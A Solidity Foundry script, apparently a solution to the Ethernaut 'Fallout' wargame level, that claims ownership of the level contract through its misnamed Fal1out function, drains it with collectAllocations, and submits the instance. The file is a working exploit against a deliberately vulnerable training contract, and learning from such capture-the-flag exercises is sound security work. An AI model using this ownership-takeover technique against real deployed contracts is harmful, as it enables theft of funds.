// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "src/02/Fallout.sol";
import {FalloutFactory} from "src/02/FalloutFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract FalloutExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL2_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new FalloutFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        Fallout(instance).Fal1out{value: 1 wei}();
        Fallout(instance).collectAllocations();

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
